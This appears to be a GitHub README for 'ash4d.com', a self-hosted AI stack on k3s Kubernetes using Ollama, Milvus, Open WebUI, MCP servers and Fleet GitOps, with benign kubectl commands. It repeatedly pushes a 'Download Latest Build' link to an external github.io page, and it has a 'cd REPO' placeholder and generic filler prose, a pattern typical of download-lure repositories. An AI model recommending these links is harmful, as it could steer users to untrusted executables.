# ash4d.com vLatest - Private AI Platform 2026

> **ash4d.com is a self-hosted private AI platform for k3s Kubernetes, combining local Qwen3 inference, retrieval-augmented generation, agent tooling, and GPU-enabled services in one GitOps-managed environment.**

[![Platform](https://img.shields.io/badge/Platform-k3s%20Kubernetes-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hallbrandonidyt2176/ash4d-ai-deployment-hub?style=flat-square)](https://github.com/hallbrandonidyt2176/ash4d-ai-deployment-hub)

---

<p align="center">
  <a href="https://hallbrandonidyt2176.github.io/ash4d-ai-deployment-hub/">
    <img src="https://img.shields.io/badge/Download-ash4d.com%20Latest-brightgreen?style=for-the-badge" alt="Download ash4d.com">
  </a>
</p>

> **[Download ash4d.com Latest](https://hallbrandonidyt2176.github.io/ash4d-ai-deployment-hub/)**

---

[Download Latest Build](https://hallbrandonidyt2176.github.io/ash4d-ai-deployment-hub/)

---

## Platform Overview

ash4d.com packages the primary components required to run a private AI stack on k3s Kubernetes. Local Qwen3 model execution is handled by Ollama, Milvus supplies vector search for retrieval-augmented generation, and Open WebUI provides the conversational interface. Model Context Protocol servers enable agent integrations, while ComfyUI delivers GPU-assisted image generation.

The project targets homelab and self-hosted environments that require an integrated platform rather than an isolated AI application. GitOps processes and SUSE Fleet support administration across multiple clusters. Longhorn, Prometheus, Grafana, MetalLB, Traefik, and Tailscale provide the storage, observability, networking, ingress, and connectivity layers needed for local infrastructure and GCP deployments.

---

## Capabilities

- Serve local Qwen3 language models with Ollama.
- Add document retrieval and embedding search through Milvus.
- Extend agent workflows with Model Context Protocol servers.
- Provide browser-based conversations in Open WebUI with Redis-backed sessions.
- Run GPU-enabled image generation through ComfyUI.
- Coordinate Kubernetes clusters using SUSE Fleet and GitOps.
- Keep application data persistent with Longhorn distributed storage.
- Collect and visualize service metrics through Prometheus and Grafana.
- Publish workloads using MetalLB together with Traefik ingress.
- Connect homelab and GCP resources over a Tailscale mesh network.

---

## Getting Started

Create a local checkout of the repository:

```bash
git clone https://github.com/hallbrandonidyt2176/ash4d-ai-deployment-hub.git
cd REPO
```

Before deployment, inspect the Kubernetes manifests and any values that vary by environment. Once the k3s cluster is prepared, an initial deployment may be applied with the appropriate manifest or GitOps process:

```bash
kubectl apply -f .
```

When operating several clusters, enroll them with SUSE Fleet and use this repository as the source for ongoing GitOps synchronization.

---

## Operating the Stack

A standard rollout follows this sequence:

1. Provision a k3s Kubernetes cluster with suitable GPU and persistent-storage capacity.
2. Install the Longhorn, networking, ingress, and observability components.
3. Launch Ollama and download or load the platform's Qwen3 model.
4. Set up Milvus to handle document and embedding retrieval.
5. Access the local model through Open WebUI.
6. Deploy MCP servers as needed for agent access to tools and services.
7. Start ComfyUI for GPU-powered image generation.
8. Apply Fleet and GitOps synchronization to keep configuration aligned between clusters.

To review currently running workloads and exposed services, run:

```bash
kubectl get pods --all-namespaces
kubectl get services --all-namespaces
```

---

## Deployment Configuration

Kubernetes manifests, deployment values, and GitOps resources in the repository control the platform configuration. The following core settings should be reviewed before installation:

```yaml
cluster:
  platform: k3s
  gitops: fleet

ai:
  inference: ollama
  model: Qwen3
  retrieval: milvus

networking:
  ingress: traefik
  loadBalancer: metallb
  mesh: tailscale

storage:
  provider: longhorn
```

Customize environment-dependent options, including GPU placement, storage sizing, ingress behavior, Tailscale links, and the clusters selected as Fleet targets.

---

## System Requirements

- A running k3s Kubernetes cluster.
- `kubectl` access to the Kubernetes environment.
- GPU resources for ComfyUI image generation and other GPU-dependent workloads.
- Persistent storage appropriate for Longhorn.
- Adequate capacity for Ollama, Qwen3, Milvus, Open WebUI, Redis, and related services.
- Network connectivity for Tailscale links between environments.
- Optional GCP connectivity for deployments that extend beyond a local homelab.
- Resources compatible with Prometheus and Grafana monitoring.

---

## Frequently Asked Questions

### What type of deployment is ash4d.com designed for?

ash4d.com is aimed at operators running a self-hosted AI environment on k3s Kubernetes, including homelab users and teams responsible for multiple clusters.

### What is the update process?

SUSE Fleet and GitOps can manage application and infrastructure changes, synchronizing repository updates to the clusters selected for deployment.

### Which files contain deployment settings?

Deployment behavior is defined in the repository's Kubernetes manifests and related values. Check GPU scheduling, storage, networking, ingress, and cluster-target configuration before applying updates.

### Is a GPU mandatory?

The platform provides GPU-accelerated ComfyUI workloads. The suitability of a GPU-free deployment depends on the services and workloads selected for operation.

### What should I check when a service fails?

Start by examining pod state, Kubernetes events, and logs in the relevant namespace:

```bash
kubectl get pods --all-namespaces
kubectl describe pod POD_NAME -n NAMESPACE
kubectl logs POD_NAME -n NAMESPACE
```

For storage or connectivity problems, also inspect Longhorn volumes, Traefik routes, MetalLB address assignments, and Tailscale links.

### Where is the current build available?

The latest published build can be accessed through the [Download Latest Build](https://hallbrandonidyt2176.github.io/ash4d-ai-deployment-hub/) link above.

---

## Planned Work

- Further streamline multi-cluster GitOps deployment processes.
- Add more integrations based on MCP agent tooling.
- Strengthen operational visibility for the AI services.
- Continue optimizing GPU, storage, and networking settings for self-hosted deployments.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
